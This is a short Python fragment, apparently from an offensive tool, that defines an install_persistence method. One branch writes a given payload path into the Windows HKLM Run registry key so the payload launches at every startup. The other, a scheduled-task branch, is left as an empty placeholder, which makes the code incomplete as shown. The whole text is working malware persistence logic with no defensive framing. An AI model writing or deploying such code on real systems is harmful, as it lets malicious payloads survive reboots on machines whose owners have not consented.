def install_persistence(self, persistence_type: str, payload_path: str = None) -> Dict[str, Any]:
    if persistence_type == "scheduled_task":
        # ... existing scheduled task logic ...
    elif persistence_type == "registry_run_key":
        try:
            import winreg  # Windows-specific library

            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") as key:
                winreg.SetValueEx(key, "MyPersistence", 0, winreg.REG_SZ, payload_path)
            return {"status": "success", "message": "Registry persistence installed"}
        except Exception as e:
            return {"status": "error", "message": f"Error installing registry persistence: {e}"}

